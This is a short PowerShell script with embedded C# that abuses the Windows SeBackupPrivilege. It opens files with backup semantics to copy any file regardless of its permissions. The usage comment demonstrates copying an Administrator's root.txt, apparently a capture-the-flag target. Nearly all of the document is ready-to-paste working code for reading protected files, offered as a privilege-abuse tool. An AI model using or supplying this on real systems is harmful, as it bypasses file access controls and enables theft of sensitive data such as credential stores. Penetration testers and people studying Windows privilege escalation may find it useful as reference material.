# this script can help u abusing SEBACKUPprivilege on windows, by allowing u to copy any file
# Usage:
#1- copy and pase this in ur powershell terminal and then:
# [BackupCopy]::Copy("C:\Users\Administrator\Desktop\root.txt", "C:\Temp\root-copy.txt")
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class BackupCopy {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr SecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    public static void Copy(string source, string dest) {
        const uint GENERIC_READ = 0x80000000;
        const uint FILE_SHARE_READ = 0x00000001;
        const uint OPEN_EXISTING = 3;
        const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;

        var handle = CreateFile(source, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, IntPtr.Zero);
        if (handle.IsInvalid)
            throw new IOException("Access denied or file not found: " + source);

        using (var fs = new FileStream(handle, FileAccess.Read))
        using (var outFile = new FileStream(dest, FileMode.Create, FileAccess.Write)) {
            fs.CopyTo(outFile);
        }
    }
}
"@

